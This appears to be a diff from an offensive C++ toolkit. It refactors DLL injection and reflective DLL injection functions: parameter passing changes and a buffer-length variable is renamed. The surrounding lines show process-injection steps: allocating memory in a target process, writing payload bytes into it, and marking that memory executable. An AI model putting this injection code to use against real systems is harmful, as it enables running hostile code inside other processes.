@@ -85,9 +85,9 @@ namespace Technique::Injection::Helper
 namespace Technique::Injection
 {
     BOOL DllInjection(
-        Procs::PPROCS       pProcs,
-        DWORD               dwPID,
-        std::vector<BYTE>   bytes
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        const std::vector<BYTE>& bytes
     ) {
         HANDLE hProcess;
         HANDLE hThread;
@@ -205,12 +205,12 @@ namespace Technique::Injection
     }
 
     BOOL ReflectiveDLLInjection(
-        Procs::PPROCS       pProcs,
-        DWORD               dwPID,
-        std::vector<BYTE>   bytes
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        const std::vector<BYTE>& bytes
     ) {        
-        LPVOID lpBuffer = bytes.data();
-        SIZE_T dwLength = bytes.size();
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
 
         HANDLE hToken;
         TOKEN_PRIVILEGES priv = {0};
@@ -246,7 +246,7 @@ namespace Technique::Injection
             pProcs,
             hProcess,
             nullptr,
-            dwLength,
+            dwBufferSize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
@@ -263,9 +263,9 @@ namespace Technique::Injection
             hProcess,
             lpRemoteBuffer,
             lpBuffer,
-            dwLength,
+            dwBufferSize,
             &dwNumberOfWritten
-        ) || dwNumberOfWritten != dwLength) {
+        ) || dwNumberOfWritten != dwBufferSize) {
             System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
@@ -277,7 +277,7 @@ namespace Technique::Injection
             pProcs,
             hProcess,
             &lpRemoteBuffer,
-            &dwLength,
+            &dwBufferSize,
             PAGE_EXECUTE_READWRITE,
             &dwOldProtect
         )) {
